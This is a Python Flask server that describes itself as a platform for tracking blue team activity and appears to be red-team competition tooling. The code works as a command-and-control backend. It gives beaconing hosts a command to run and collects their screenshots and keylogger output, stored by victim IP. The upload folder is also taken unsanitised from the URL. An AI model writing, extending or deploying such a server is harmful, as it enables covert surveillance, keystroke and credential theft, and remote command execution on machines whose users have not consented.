"""
A platform for tracking blue team activity
Author: Chris Vantine
"""
import os, sys
sys.path.insert(0, os.path.abspath("../.."))
import server.src.database as database
from flask import Flask
from flask import request
from werkzeug.utils import secure_filename

# set basic flask settings
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'png', 'jpg'}

# spin up new database
db = database.Database("db.sqlite", "server/src/build_db.sql")


def start_server(ip, port):
    """
    start the server
    :param ip: interface to host on
    :param port: port to host on
    :return: None
    """
    # TODO: Remove this test code
    print(db.get_keystrokes('10.0.0.2'))

    app.run(host=ip, port=port)


def allowed_file(filename):
    """
    checks if file is allowed
    """
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']


@app.route("/conn")
@app.route("/conn/")
def beacon_handler():
    """
    manage beaconing connections
    :return: command to run on reporter
    """
    return "whoami"


@app.route("/screen/<host>", methods=['POST'])
@app.route("/screen/<host>/", methods=['POST'])
def screenshot_handler(host):
    """
    Handler for screenshot uploads
    :param host: ip of reporter
    :return:  "invalid" if failed, "success" if successful
    """
    # set upload folder to hostname
    app.config['UPLOAD_FOLDER'] = host

    # attempt to save file to disk
    try:
        file = request.files['file']
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))

            # update database and return success
            db.add_file(host, filename)
            return "success"

        # fail if file type not allowed
        return "invalid"
    except:
        return "invalid"


@app.route("/key/<host>", methods=['POST'])
@app.route("/key/<host>/", methods=['POST'])
def keylog_handler(host):
    """
    Handler for keylogger data, line by line
    :param host: ip of reporter
    :return: "invalid" if failed, "success" if successful
    """
    try:
        print("1")
        data = request.data
        print("2")
        db.add_keystroke(host, data)
        print("3")
        return "success"
    except:
        return "failed"
